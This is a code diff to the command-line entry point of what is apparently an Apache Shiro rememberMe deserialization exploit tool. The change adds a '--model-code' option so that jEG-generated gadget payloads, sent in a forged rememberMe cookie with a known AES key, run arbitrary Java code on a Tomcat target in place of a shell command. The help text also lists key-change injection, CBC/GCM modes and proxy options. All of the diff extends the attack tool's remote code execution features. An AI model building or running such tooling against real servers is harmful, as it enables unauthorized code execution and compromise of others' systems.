@@ -148,14 +148,17 @@ public class MainCLI {
         AttackService.realShiroKey = key;
 
         boolean jegMode = cli.hasFlag("--jeg");
+        boolean modelCode = cli.hasFlag("--model-code");
         String gadget = cli.opt("-g");
         String echo = cli.opt("-e");
         if (echo == null || echo.isEmpty()) echo = "AllEcho";
 
         if (jegMode) {
+            String model = modelCode ? "MODEL_CODE" : "MODEL_CMD";
+            String codeText = modelCode ? cli.opt("--code", "") : "";
             EchoGenerateResult jegResult = as.generateEchoWithThirdParty(
-                    "jEG", "SERVER_TOMCAT", "MODEL_CMD", "FORMAT_BASE64",
-                    gadget, echo, key, command, "");
+                    "jEG", "SERVER_TOMCAT", model, "FORMAT_BASE64",
+                    gadget, echo, key, command, codeText);
             if (!jegResult.isSuccess() || jegResult.getPayload() == null) {
                 System.out.println(jegResult.isSuccess() ? "jEG 生成失败，payload 为空" : "jEG 生成失败: " + jegResult.getMessage());
                 return;
@@ -166,7 +169,12 @@ public class MainCLI {
                 return;
             }
             AttackService.attackRememberMe = cookieLine;
-            String result = as.sendRememberMeCookieExploitWithCmd(cookieLine, command, true, null);
+            String result;
+            if (modelCode) {
+                result = as.sendRememberMeCookieExploitWithCode(cookieLine, codeText, command, null);
+            } else {
+                result = as.sendRememberMeCookieExploitWithCmd(cookieLine, command, true, null);
+            }
             if (result != null) {
                 System.out.println(result);
             }
@@ -299,6 +307,8 @@ public class MainCLI {
         System.out.println("  --newkey <nk>       New Shiro AES key for changekey");
         System.out.println("  --variant <v>       Key change injection variant");
         System.out.println("  --jeg               Use jEG (third-party echo generator, requires --gcm)");
+        System.out.println("  --model-code        Use jEG MODEL_CODE mode (execute Java code, not shell command)");
+        System.out.println("  --code <code>       Java code to execute in MODEL_CODE mode");
         System.out.println("  --cbc               AES-CBC mode (Shiro <= 1.2.4)");
         System.out.println("  --gcm               AES-GCM mode (Shiro >= 1.2.5)");
         System.out.println("  --proxy <url>       HTTP proxy (http://host:port)");
